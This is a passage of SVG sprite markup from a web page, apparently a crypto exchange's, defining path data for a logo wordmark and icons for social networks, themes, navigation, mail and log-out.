        <path d="M1443.84 511.573333h-188.416V115.370667h184.32c81.237333 0 130.773333 40.576 130.773333 102.314666v1.621334c0 44.672-23.552 69.845333-51.968 85.248 45.482667 17.877333 73.898667 43.861333 73.898667 97.450666v0.853334c-0.853333 73.045333-59.306667 108.8-148.608 108.8z m38.954667-279.338666c0-25.984-20.266667-40.576-56.832-40.576h-86.058667v83.626666h80.384c38.144 0 62.506667-12.16 62.506667-42.24v-0.810666z m22.741333 159.146666c0-26.752-19.456-43.008-64.128-43.008h-101.546667V435.2h103.978667c38.144 0 61.696-13.781333 61.696-43.008v-0.853333z m181.930667 120.234667V115.328h86.869333v396.288H1687.466667z m481.536 0l-191.658667-251.733333v251.733333h-86.058667V115.328h80.384l185.941334 244.394667V115.328h86.101333v396.288h-74.709333z m466.133333 0l-36.565333-88.533333h-167.253334l-35.754666 88.533333h-89.344l169.728-399.573333h80.384l170.538666 399.573333h-91.733333zM2514.944 217.6l-52.778667 128.298667h105.557334L2514.944 217.6z m552.96 293.973333l-191.573333-251.733333v251.733333h-86.101334V115.328h80.384l185.941334 244.394667V115.328h86.101333v396.288h-74.709333z m362.24 7.253334c-116.949333 0-203.050667-90.112-203.050667-203.776v-0.853334c0-112.853333 85.290667-204.629333 207.061334-204.629333 74.752 0 119.381333 25.173333 155.946666 60.928L3534.890667 234.666667c-30.890667-27.605333-61.738667-44.629333-101.546667-44.629334-66.56 0-115.285333 55.210667-115.285333 123.434667v0.810667c0 68.181333 47.104 124.245333 115.328 124.245333 45.44 0 73.045333-17.92 103.936-46.293333l55.210666 56.021333c-40.618667 43.050667-86.101333 70.656-162.432 70.656z m232.234667-7.253334V115.328h298.837333V193.28h-211.968v80.384h186.794667v77.952h-186.794667v83.626667h215.210667v76.373333h-302.08z m-1447.893334 160.768h-159.146666v76.330667h141.269333v44.672h-141.312v114.474667h-49.493333v-280.96h208.64v45.482666z m301.226667 113.706667c0 83.626667-47.061333 125.866667-120.96 125.866667-73.088 0-119.381333-42.24-119.381333-123.434667v-161.621333h49.536v159.146666c0 52.010667 26.794667 80.426667 70.656 80.426667s70.656-26.794667 70.656-77.952v-161.621333h49.493333v159.146666z m198.997333 121.770667h-49.536v-234.666667H2575.786667v-45.482667h227.413333v45.482667h-89.344v234.666667h0.810667z m388.949334-121.770667c0 83.626667-47.104 125.866667-121.002667 125.866667-73.088 0-119.338667-42.24-119.338667-123.434667v-161.621333h49.493334v159.146666c0 52.010667 26.837333 80.426667 70.656 80.426667 43.861333 0 70.656-26.794667 70.656-77.952v-161.621333h49.536v159.146666z m265.557333 121.770667l-69.034667-97.450667h-61.696v97.450667H3188.906667v-280.96h125.013333c64.170667 0 103.978667 34.133333 103.978667 89.344 0 46.293333-27.605333 74.666667-66.56 85.248l75.52 106.368h-57.685334z m-58.453333-235.52H3239.253333v94.250666h72.277334c34.901333 0 57.6-18.688 57.6-47.104-0.768-30.848-21.888-47.104-58.453334-47.104z m392.192-0.768h-158.336v73.088h140.501333v43.861333h-140.501333v75.52h160.768v43.818667h-210.346667v-280.96h207.914667v44.672z m185.173333 73.898666c59.306667 14.592 90.112 35.712 90.112 82.816 0 52.778667-41.386667 84.48-99.84 84.48a171.477333 171.477333 0 0 1-116.949333-44.672l30.037333-34.944c26.794667 23.552 53.589333 36.565333 88.490667 36.565334 30.890667 0 49.536-13.824 49.536-35.754667 0-20.266667-11.349333-31.658667-63.317334-43.008-60.117333-14.634667-93.397333-31.701333-93.397333-84.48 0-48.725333 39.808-82.005333 95.829333-82.005333 40.576 0 73.088 12.202667 101.504 34.901333l-26.794666 37.376c-25.173333-18.688-50.346667-29.226667-76.373334-29.226667-29.184 0-45.44 14.592-45.44 33.28 0.810667 21.930667 13.013333 31.658667 66.56 44.672z m-2063.445333-0.853333h-570.026667v47.146667h570.026667v-47.104zM115.328 396.330667L0 511.573333l115.328 115.285334 116.096-115.285334-116.096-115.328z m396.288-164.864l198.101333 198.144 115.328-115.285334-197.333333-198.954666L511.616 0 396.288 115.328 198.144 313.472l115.328 115.285333 198.144-197.333333z m396.245333 164.864l-115.285333 115.328 115.285333 115.285333L1024 511.616l-116.138667-115.328z m-396.245333 396.288l-198.144-198.144-115.328 115.285333 198.144 198.144L511.573333 1024l115.285334-115.328 198.144-198.101333-115.328-116.138667-198.101334 198.144z m0-164.864l116.096-116.096-116.096-115.328-115.328 115.328 115.328 116.096z"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-instagram">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12.0001 7.38184C9.44926 7.38184 7.38184 9.44926 7.38184 12.0001C7.38184 14.551 9.44926 16.6184 12.0001 16.6184C14.551 16.6184 16.6184 14.551 16.6184 12.0001C16.6184 9.44926 14.551 7.38184 12.0001 7.38184ZM12.0001 15.0036C10.3441 15.0036 8.99669 13.6561 8.99669 12.0001C8.99669 10.3441 10.3441 8.99669 12.0001 8.99669C13.6561 8.99669 15.0036 10.3441 15.0036 12.0001C15.0036 13.6561 13.6561 15.0036 12.0001 15.0036Z" fill="currentColor"></path>
        <path d="M17.8836 7.1967C17.8836 7.79317 17.4001 8.2767 16.8036 8.2767C16.2072 8.2767 15.7236 7.79317 15.7236 7.1967C15.7236 6.60023 16.2072 6.1167 16.8036 6.1167C17.4001 6.1167 17.8836 6.60023 17.8836 7.1967Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 3C9.552 3 9.25371 3.01029 8.28686 3.05143C7.33029 3.10286 6.672 3.24686 6.10629 3.47314C5.50971 3.69943 5.016 4.008 4.512 4.512C4.008 5.016 3.69943 5.50971 3.47314 6.10629C3.24686 6.672 3.10286 7.33029 3.05143 8.28686C3.01029 9.25371 3 9.552 3 12C3 14.448 3.01029 14.7463 3.05143 15.7131C3.09257 16.6697 3.24686 17.328 3.47314 17.8937C3.69943 18.4903 4.008 18.984 4.512 19.488C5.016 19.992 5.50971 20.3006 6.10629 20.5269C6.68229 20.7531 7.33029 20.8971 8.28686 20.9486C9.24343 20.9897 9.552 21 12 21C14.448 21 14.7463 20.9897 15.7131 20.9486C16.6697 20.9074 17.328 20.7531 17.8937 20.5269C18.4903 20.3006 18.984 19.992 19.488 19.488C19.992 18.984 20.3006 18.4903 20.5269 17.8937C20.7531 17.3177 20.8971 16.6697 20.9486 15.7131C20.9897 14.7566 21 14.448 21 12C21 9.552 20.9897 9.25371 20.9486 8.28686C20.9074 7.33029 20.7531 6.672 20.5269 6.10629C20.3006 5.50971 19.992 5.016 19.488 4.512C18.984 4.008 18.4903 3.69943 17.8937 3.47314C17.3177 3.24686 16.6697 3.10286 15.7131 3.05143C14.7463 3.01029 14.448 3 12 3ZM12 4.62514C14.4069 4.62514 14.6846 4.63543 15.6411 4.67657C16.5154 4.71771 16.9989 4.86171 17.3074 4.98514C17.7291 5.14971 18.0274 5.34514 18.3463 5.65371C18.6651 5.97257 18.8606 6.27086 19.0149 6.69257C19.1383 7.01143 19.2823 7.48457 19.3234 8.35886C19.3646 9.30514 19.3749 9.59314 19.3749 12C19.3749 14.4069 19.3646 14.6846 19.3234 15.6411C19.2823 16.5154 19.1383 16.9989 19.0149 17.3074C18.8503 17.7291 18.6549 18.0274 18.3463 18.3463C18.0274 18.6651 17.7291 18.8606 17.3074 19.0149C16.9886 19.1383 16.5154 19.2823 15.6411 19.3234C14.6949 19.3646 14.4069 19.3749 12 19.3749C9.59314 19.3749 9.31543 19.3646 8.35886 19.3234C7.48457 19.2823 7.00114 19.1383 6.69257 19.0149C6.27086 18.8503 5.97257 18.6549 5.65371 18.3463C5.33486 18.0274 5.13943 17.7291 4.98514 17.3074C4.86171 16.9886 4.71771 16.5154 4.67657 15.6411C4.63543 14.6949 4.62514 14.4069 4.62514 12C4.62514 9.59314 4.63543 9.31543 4.67657 8.35886C4.71771 7.48457 4.86171 7.00114 4.98514 6.69257C5.14971 6.27086 5.34514 5.97257 5.65371 5.65371C5.97257 5.33486 6.27086 5.13943 6.69257 4.98514C7.01143 4.86171 7.48457 4.71771 8.35886 4.67657C9.31543 4.63543 9.59314 4.62514 12 4.62514Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-linkedin">
        <path d="M19.6629 3H4.32686C3.59657 3 3 3.58629 3 4.30629V19.704C3 20.424 3.59657 21 4.32686 21H19.6629C20.4034 21 21 20.424 21 19.704V4.30629C21 3.58629 20.4034 3 19.6629 3ZM8.33829 18.3463H5.664V9.75771H8.33829V18.3463ZM7.00114 8.57486C6.14743 8.57486 5.45829 7.88571 5.45829 7.032C5.45829 6.17829 6.14743 5.47886 7.00114 5.47886C7.85486 5.47886 8.55429 6.17829 8.55429 7.032C8.55429 7.88571 7.85486 8.57486 7.00114 8.57486ZM18.336 18.3463H15.672V14.1703C15.672 13.1726 15.6514 11.8869 14.2834 11.8869C12.8949 11.8869 12.6789 12.9771 12.6789 14.0983V18.3463H10.0149V9.75771H12.576V10.9303H12.6069C12.9669 10.2514 13.8411 9.54171 15.1371 9.54171C17.8423 9.54171 18.336 11.3211 18.336 13.6354V18.3463Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-market">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.5 4H14.5V19H9.5V4ZM3 11H7.5V19H3V11ZM21 9H16.5V19H21V9Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-medium">
        <path d="M3 3V21H21V3H3ZM17.9519 7.26316L16.984 8.18993C16.9016 8.25172 16.8604 8.35469 16.881 8.45767V15.2643C16.8604 15.3673 16.9016 15.4703 16.984 15.532L17.9314 16.4588V16.6648H13.1842V16.4588L14.1625 15.5114C14.2654 15.4188 14.2654 15.3879 14.2654 15.2437V9.74485L11.5469 16.6339H11.1762L8.01487 9.74485V14.3684C7.99428 14.5538 8.05606 14.7494 8.18993 14.8936L9.46682 16.4382V16.6339H5.8627V16.4382L7.12929 14.8936C7.26316 14.7494 7.32494 14.5538 7.29405 14.3684V9.02403C7.31465 8.86957 7.25286 8.7254 7.13959 8.62243L6.01716 7.26316V7.05721H9.51831L12.2265 13.0092L14.6053 7.05721H17.9519V7.26316Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-reddit">
        <path d="M9.71176 11.9941C10.2872 11.9941 10.756 12.463 10.756 13.0384C10.756 13.6138 10.2872 14.0827 9.71176 14.0827C9.13634 14.0827 8.66748 13.6138 8.66748 13.0384C8.66748 12.463 9.13634 11.9941 9.71176 11.9941Z" fill="currentColor"></path>
        <path d="M12.0028 16.0217C12.6847 16.0217 13.6438 15.8619 14.0913 15.4143C14.1979 15.3078 14.3684 15.3078 14.4749 15.4037C14.5815 15.5102 14.5815 15.6807 14.4749 15.7873C13.761 16.5012 12.4077 16.5545 12.0028 16.5545C11.5978 16.5545 10.2445 16.5012 9.5306 15.7979C9.42404 15.6914 9.42404 15.5209 9.5306 15.4143C9.63716 15.3078 9.80766 15.3078 9.91421 15.4143C10.3618 15.8619 11.3208 16.0217 12.0028 16.0217Z" fill="currentColor"></path>
        <path d="M13.2495 13.0492C13.2495 12.4737 13.7184 12.0049 14.2938 12.0049C14.8585 12.0049 15.3274 12.4737 15.3381 13.0492C15.3381 13.6246 14.8692 14.0934 14.2938 14.0934C13.7184 14.0934 13.2495 13.6246 13.2495 13.0492Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12.003 2.00977C6.48328 2.00977 2.00781 6.48523 2.00781 12.005C2.00781 17.5247 6.48328 22.0002 12.003 22.0002C17.5227 22.0002 21.9982 17.5354 21.9982 12.005C21.9876 6.48523 17.5227 2.00977 12.003 2.00977ZM17.7998 13.3369C17.8211 13.4755 17.8318 13.6247 17.8318 13.7738C17.8318 16.0222 15.2211 17.8337 12.003 17.8337C8.78494 17.8337 6.17426 16.0222 6.17426 13.7738C6.17426 13.6247 6.18491 13.4755 6.20622 13.3369C5.69474 13.1132 5.3431 12.6017 5.3431 12.005C5.3431 11.2058 5.99311 10.5451 6.80295 10.5451C7.19722 10.5451 7.54886 10.6943 7.81526 10.95C8.82756 10.2148 10.2235 9.75658 11.7792 9.71395C11.7792 9.69264 12.5145 6.22949 12.5145 6.22949C12.5145 6.16555 12.5571 6.10162 12.6104 6.06965C12.6637 6.02703 12.7383 6.01637 12.8129 6.02703L15.2317 6.54916C15.4022 6.20818 15.7539 5.96309 16.1588 5.96309C16.7342 5.96309 17.2031 6.42129 17.2031 7.00737C17.2031 7.59344 16.7342 8.05164 16.1588 8.05164C15.6047 8.05164 15.1465 7.61475 15.1252 7.06064L12.9514 6.59179L12.2907 9.71395C13.8252 9.76723 15.1998 10.2361 16.1908 10.95C16.4572 10.6943 16.8088 10.5345 17.2031 10.5345C18.0129 10.5345 18.6629 11.1845 18.6629 11.9943C18.6629 12.6017 18.3006 13.1025 17.7998 13.3369Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-steemit">
        <path d="M18.8494 8.4353C18.0917 7.69356 17.1973 7.14755 16.2397 6.78699C16.7974 5.20048 18.7862 4.61327 18.7862 4.61327C18.7862 4.61327 14.2193 2.28502 9.1788 3.2225C7.49513 3.48005 5.8746 4.47934 4.71708 5.8186C2.16001 8.70315 2.49674 13.0712 5.47473 15.5437C5.93774 15.9248 6.95846 16.5121 6.95846 16.543C6.30604 18.2325 4.14884 18.6858 4.14884 18.6858C4.14884 18.6858 7.00055 20.4371 10.7993 20.8904C11.8306 21.014 12.8934 21.0449 13.9878 20.9213C15.7346 20.7874 17.4919 19.8499 18.8494 18.5828C21.7011 15.8012 21.7326 11.258 18.8494 8.4353ZM17.555 17.4804C16.4712 18.5209 14.8822 19.17 13.6195 19.2627C12.725 19.3657 11.799 19.3657 10.9046 19.2627C9.57867 19.1082 8.62108 18.7476 7.66349 18.387C8.1265 17.9337 8.62108 17.3259 8.82102 16.7696C8.94729 16.4502 8.91572 16.0897 8.78945 15.8012C7.7582 13.7511 8.22121 11.3199 9.87331 9.73335C11.0729 8.56923 12.725 8.05413 14.4087 8.24987C15.6399 8.4044 16.7658 8.9298 17.6603 9.76426C19.7754 11.8762 19.7122 15.4097 17.555 17.4804Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-telegram">
        <path d="M12 2C6.47761 2 2 6.47761 2 11.9893C2 17.5117 6.47761 22 12 22C17.5224 22 22 17.5117 22 11.9893C22 6.47761 17.5224 2 12 2ZM16.9254 8.27932C16.8614 9.20682 15.145 16.1365 15.145 16.1365C15.145 16.1365 15.0384 16.5416 14.6652 16.5522C14.5373 16.5522 14.3667 16.5416 14.1748 16.3603C13.7804 16.0299 12.8849 15.3902 12.0426 14.8038C12.0107 14.8358 11.9787 14.8678 11.936 14.8998C11.7441 15.0704 11.4563 15.3156 11.1471 15.6141C11.0299 15.7207 10.9019 15.838 10.774 15.9659L10.7633 15.9765C10.6887 16.0512 10.6247 16.1045 10.5714 16.1471C10.1557 16.4883 10.113 16.2004 10.113 16.0512L10.3369 13.6098V13.5885L10.3475 13.5672C10.3582 13.5352 10.3795 13.5245 10.3795 13.5245C10.3795 13.5245 14.7399 9.64392 14.8571 9.22815C14.8678 9.20682 14.8358 9.1855 14.7825 9.20682C14.4947 9.30277 9.47335 12.4797 8.91898 12.8316C8.88699 12.8529 8.79104 12.8422 8.79104 12.8422L6.34968 12.0426C6.34968 12.0426 6.06183 11.9254 6.15778 11.6588C6.1791 11.6055 6.21109 11.5522 6.32836 11.4776C6.87207 11.0938 16.3284 7.69296 16.3284 7.69296C16.3284 7.69296 16.5949 7.60768 16.7548 7.66098C16.8294 7.69296 16.8721 7.72495 16.9147 7.83156C16.9254 7.8742 16.936 7.95949 16.936 8.05544C16.936 8.10874 16.9254 8.17271 16.9254 8.27932Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-tiktok">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.5168 3C15.8138 5.55428 17.2395 7.07713 19.7181 7.23914V10.112C18.2817 10.2524 17.0234 9.78262 15.56 8.89699V14.2702C15.56 21.096 8.11856 23.2291 5.12686 18.3365C3.2044 15.1882 4.38164 9.66382 10.5486 9.44241V12.4719C10.0788 12.5475 9.5766 12.6663 9.11759 12.8229C7.74594 13.2873 6.96832 14.1568 7.18433 15.6904C7.60014 18.6281 12.9895 19.4975 12.5413 13.7571V3.0054H15.5168V3Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-top-menu-s">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M4 4H8V8H4V4ZM4 10H8V14H4V10ZM8 16H4V20H8V16ZM10 4H14V8H10V4ZM14 10H10V14H14V10ZM10 16H14V20H10V16ZM20 4H16V8H20V4ZM16 10H20V14H16V10ZM20 16H16V20H20V16Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-twitter">
        <path d="M8.28726 20.5C15.832 20.5 19.9621 13.965 19.9621 8.30213C19.9621 8.12092 19.9621 7.93971 19.9512 7.74717C20.7534 7.1469 21.4472 6.38807 22 5.52732C21.2629 5.86709 20.4715 6.0936 19.6369 6.20686C20.4824 5.67455 21.1328 4.83644 21.4472 3.82845C20.6558 4.32678 19.7778 4.67788 18.8347 4.87042C18.0867 4.02099 17.0244 3.5 15.8428 3.5C13.5772 3.5 11.7344 5.42538 11.7344 7.79247C11.7344 8.13225 11.7778 8.44937 11.8428 8.76649C8.43902 8.5966 5.41463 6.87508 3.38753 4.28148C3.02981 4.92705 2.83469 5.66322 2.83469 6.4447C2.83469 7.92838 3.56098 9.24217 4.65583 10.0123C3.98374 9.98967 3.35501 9.79714 2.80217 9.48001C2.80217 9.49134 2.80217 9.51399 2.80217 9.53664C2.80217 11.6093 4.22222 13.3534 6.08672 13.7385C5.73984 13.8404 5.38211 13.8857 5.00271 13.8857C4.74255 13.8857 4.48238 13.8631 4.23306 13.8065C4.75339 15.5167 6.271 16.7512 8.07046 16.7851C6.66125 17.9404 4.89431 18.6199 2.97561 18.6199C2.65041 18.6199 2.31436 18.6086 2 18.5633C3.8103 19.7865 5.96748 20.5 8.28726 20.5Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-vk">
        <path d="M12 2C6.47761 2 2 6.47761 2 12C2 17.5224 6.47761 22 12 22C17.5224 22 22 17.5224 22 12C22 6.47761 17.5117 2 12 2ZM18.1407 16.2644H16.6908C16.1365 16.2644 15.9765 15.8166 14.9851 14.8252C14.1215 13.9936 13.7484 13.8763 13.5352 13.8763C13.2367 13.8763 13.1514 13.951 13.1514 14.3667V15.678C13.1514 16.0299 13.0341 16.2431 12.1066 16.2431C10.5714 16.2431 8.86567 15.3156 7.66098 13.5778C5.84861 11.0405 5.35821 9.12154 5.35821 8.73774C5.35821 8.52452 5.43284 8.33262 5.84861 8.33262H7.31983C7.6823 8.33262 7.83156 8.49254 7.97015 8.89765C8.68443 10.9765 9.88913 12.7889 10.3795 12.7889C10.5608 12.7889 10.6461 12.7036 10.6461 12.2345V10.1023C10.5928 9.11087 10.0704 9.02559 10.0704 8.67377C10.0704 8.5032 10.209 8.33262 10.4328 8.33262H12.7143C13.0235 8.33262 13.1407 8.5032 13.1407 8.86567V11.7548C13.1407 12.064 13.2687 12.1812 13.3646 12.1812C13.5458 12.1812 13.7058 12.064 14.0469 11.7335C15.0917 10.5608 15.838 8.75906 15.838 8.75906C15.9339 8.54584 16.1045 8.35394 16.4776 8.35394H17.9275C18.3646 8.35394 18.4606 8.57783 18.3646 8.88699C18.1834 9.72921 16.4136 12.2239 16.4136 12.2452C16.2537 12.5011 16.2004 12.6077 16.4136 12.8955C16.5736 13.1087 17.0746 13.5458 17.4158 13.9403C18.0341 14.6439 18.5139 15.2409 18.6418 15.6461C18.7591 16.0512 18.5565 16.2644 18.1407 16.2644Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-weibo">
        <path d="M15.6727 3.47929C16.0574 3.40799 17.3599 3.16657 18.6262 3.45342C20.9172 3.97043 24.0619 6.11337 22.6476 10.6737H22.6429C22.5449 11.3247 22.2104 11.3775 21.8125 11.3775C21.3366 11.3775 20.9513 11.0875 20.9513 10.6267C20.9513 10.2267 21.1225 9.82094 21.1225 9.82094C21.125 9.81243 21.1285 9.80168 21.1327 9.78872C21.211 9.54577 21.5388 8.52848 20.857 7.04579C19.54 4.90583 16.8881 4.87485 16.5744 4.99687C16.2583 5.11616 15.7924 5.17685 15.7924 5.17685C15.3134 5.17685 14.9287 4.79967 14.9287 4.34066C14.9287 3.95606 15.1948 3.63003 15.5579 3.53082C15.5579 3.53082 15.5663 3.51769 15.5794 3.51534C15.5915 3.51295 15.6036 3.50623 15.6159 3.49938C15.6303 3.49132 15.6451 3.48308 15.6605 3.48154L15.6727 3.47929Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.90229 12.4174C5.2782 12.8277 5.69688 16.1118 5.69688 16.1118C5.69688 16.1118 5.65988 17.1523 6.6686 17.6819C8.789 18.7926 10.972 18.1198 12.0756 16.7419C13.1791 15.3633 12.5313 12.0099 8.90229 12.4174ZM9.49469 15.2105C9.61574 15.4094 9.89789 15.4323 10.127 15.2667C10.3513 15.0959 10.4376 14.7979 10.3166 14.599C10.1955 14.4053 9.91633 14.3497 9.64732 14.5429C9.41592 14.7061 9.36823 15.0168 9.49469 15.2105ZM6.76709 16.1792C6.76709 16.7263 7.31159 17.1046 7.98859 17.0277C8.66266 16.9532 9.21076 16.4492 9.21076 15.9035C9.21076 15.3561 8.70493 14.9229 7.92827 14.9946C7.25074 15.0627 6.76709 15.6336 6.76709 16.1792Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M17.2931 11.5952C16.4372 11.4341 16.853 10.9889 16.853 10.9889C16.853 10.9889 17.6904 9.65351 16.6871 8.68256C15.4441 7.4801 12.4236 8.83565 12.4236 8.83565C11.4432 9.12977 11.5166 8.8097 11.6611 8.17989C11.6866 8.06865 11.7144 7.94776 11.7389 7.81888C11.7389 6.80728 11.3809 5.09539 8.30739 6.10636C5.23731 7.12313 2.60093 10.685 2.60093 10.685C0.767333 13.0522 1.01071 14.8815 1.01071 14.8815C1.46823 18.92 5.90299 20.0285 9.35294 20.2909C12.9818 20.5673 17.88 19.0805 19.3653 16.0283C20.8505 12.9707 18.1522 11.7608 17.2931 11.5952ZM9.62168 19.153C6.01911 19.3158 3.10645 17.5677 3.10645 15.2411C3.10645 12.9125 6.01898 11.0448 9.62168 10.8842C13.2268 10.7238 16.1453 12.1606 16.1453 14.4851C16.1453 16.8112 13.2268 18.9949 9.62168 19.153Z" fill="currentColor"></path>
        <path d="M19.0585 10.1733C19.3509 10.1733 19.599 9.96413 19.6408 9.6914C19.6456 9.67133 19.6484 9.65348 19.6484 9.63058C20.0911 5.78032 16.3882 6.44284 16.3882 6.44284C16.0595 6.44284 15.7959 6.70026 15.7959 7.02118C15.7959 7.33763 16.0595 7.59488 16.3882 7.59488C19.0478 7.02638 18.4609 9.59973 18.4609 9.59973C18.4609 9.91831 18.7293 10.1733 19.0585 10.1733Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-youtube">
        <path d="M22.5574 6.94689C22.3051 6.04851 21.5602 5.33208 20.6111 5.09327C18.8931 4.66113 12.0091 4.66113 12.0091 4.66113C12.0091 4.66113 5.113 4.66113 3.39499 5.09327C2.44589 5.34345 1.71303 6.04851 1.44872 6.94689C0.992188 8.58444 0.992188 11.996 0.992188 11.996C0.992188 11.996 0.992188 15.4076 1.44872 17.0452C1.70102 17.9549 2.44589 18.66 3.39499 18.8988C5.113 19.3309 11.997 19.3309 11.997 19.3309C11.997 19.3309 18.8811 19.3309 20.5991 18.8988C21.5362 18.66 22.2931 17.9549 22.5454 17.0452C23.0019 15.4076 23.0019 11.996 23.0019 11.996C23.0019 11.996 23.0139 8.58444 22.5574 6.94689ZM9.75042 15.1006V8.90286L15.5051 11.996L9.75042 15.1006Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="id-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M3 5H21V19H3V5ZM10 10.0003C10 11.1048 9.10457 12.0003 8 12.0003C6.89543 12.0003 6 11.1048 6 10.0003C6 8.8957 6.89543 8.00027 8 8.00027C9.10457 8.00027 10 8.8957 10 10.0003ZM13 9.00027H19V11.5003H13V9.00027ZM19 13.4997H13V15.9997H19V13.4997ZM11 13.4997V15.9997H5V13.4997H11Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="language-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.2307 20.4027C18.2316 19.2481 20.4577 16.5321 20.9137 13.25H16.9718C16.8248 16.1102 16.1791 18.638 15.2307 20.4027ZM14.473 13.25C14.2952 17.3518 13.2556 20.5 11.9998 20.5C10.744 20.5 9.70447 17.3518 9.52667 13.25H14.473ZM14.473 10.75H9.52667C9.70447 6.64821 10.744 3.5 11.9998 3.5C13.2556 3.5 14.2952 6.64821 14.473 10.75ZM16.9718 10.75H20.9137C20.4577 7.46786 18.2316 4.75191 15.2307 3.59731C16.1791 5.36198 16.8248 7.88979 16.9718 10.75ZM7.03566 10.75C7.18282 7.88774 7.82928 5.35836 8.77882 3.59353C5.77291 4.74598 3.54249 7.46427 3.08594 10.75H7.03566ZM7.03566 13.25H3.08594C3.54249 16.5357 5.77291 19.254 8.77882 20.4065C7.82928 18.6416 7.18282 16.1123 7.03566 13.25Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="log-out-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M3.22266 6V3H6.22266H11.7227V6L6.22266 6L6.22266 18H11.7227V21H6.22266H3.22266V18V6ZM8.59134 13.5V10.5L15.1783 10.5L15.1782 5.98418L21.2079 12L15.1783 17.9797L15.1783 13.5H8.59134Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 25 24" id="logo">
        <path d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 25 24" id="mail-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21.5 5.00039H3.5V19.4004H21.5V5.00039ZM3.50009 7.70036L12.4998 13.4276L21.4997 7.70039V10.9007L12.4998 16.6279L3.50016 10.9007L3.50009 7.70036Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="menu-hamburger-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M4 4H20V7H4V4ZM4 10.5H20V13.5H4V10.5ZM20 17H4V20H20V17Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="mode-dark">
        <path d="M20.9677 12.7676C19.84 13.5449 18.4732 13.9999 17 13.9999C13.134 13.9999 10 10.8659 10 6.99994C10 5.52678 10.4551 4.15991 11.2323 3.03223C6.62108 3.42175 3 7.28797 3 11.9999C3 16.9705 7.02944 20.9999 12 20.9999C16.712 20.9999 20.5782 17.3789 20.9677 12.7676Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="mode-light">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M10.5 2H13.5V5H10.5V2ZM16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12ZM5.98948 3.86891L3.86816 5.99023L5.98948 8.11155L8.1108 5.99023L5.98948 3.86891ZM2 13.5V10.5H5V13.5H2ZM3.86794 18.0095L5.98926 20.1309L8.11058 18.0095L5.98926 15.8882L3.86794 18.0095ZM13.5 19V22H10.5V19H13.5ZM18.01 15.8884L15.8887 18.0098L18.01 20.1311L20.1313 18.0098L18.01 15.8884ZM19 10.5H22V13.5H19V10.5ZM15.8894 5.99001L18.0107 8.11133L20.1321 5.99001L18.0107 3.86869L15.8894 5.99001Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="nav-collapse">
        <path d="M3 10.5V13.5L21 13.5V10.5L3 10.5Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="nav-expand">
        <path d="M13.5 3H10.5V10.5L3 10.5V13.5H10.5V21H13.5V13.5H21V10.5L13.5 10.5V3Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 25 24" id="news-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9 4H20.5V16C20.5 18.2091 18.7091 20 16.5 20H8C6.067 20 4.5 18.433 4.5 16.5V10H9V4ZM9 12.5H7V16.5C7 17.0523 7.44772 17.5 8 17.5C8.55228 17.5 9 17.0523 9 16.5V12.5ZM11.7581 7H17.7581V9H11.7581V7ZM17.7581 11H11.7581V13H17.7581V11Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="notification-f">
